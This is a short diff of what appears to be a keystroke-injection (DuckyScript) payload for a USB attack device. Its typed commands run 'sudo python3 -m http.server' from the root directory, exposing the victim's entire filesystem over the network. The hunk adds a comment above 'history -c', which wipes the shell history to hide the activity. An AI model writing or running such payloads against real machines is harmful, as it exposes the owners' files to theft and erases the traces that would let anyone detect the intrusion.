@@ -14,6 +14,7 @@ STRING cd / && sudo python3 -m http.server
 DELAY 200
 ENTER
 
+REM Clear command history
 STRING history -c
 DELAY 200
 ENTER
